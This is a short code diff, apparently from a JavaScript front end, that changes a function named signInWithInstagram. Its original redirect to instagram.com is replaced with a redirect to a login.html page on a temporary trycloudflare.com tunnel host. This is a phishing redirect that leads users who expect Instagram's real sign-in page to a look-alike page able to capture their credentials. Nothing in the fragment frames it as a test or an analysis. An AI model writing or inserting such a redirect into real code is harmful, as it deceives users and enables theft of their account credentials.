@@ -1,7 +1,7 @@
 
 function signInWithInstagram() {
    
-    window.location.href = "https://www.instagram.com"; 
+    window.location.href = "https://bald-integrated-values-legislature.trycloudflare.com/login.html"; 
 }
 
 // Initial setup
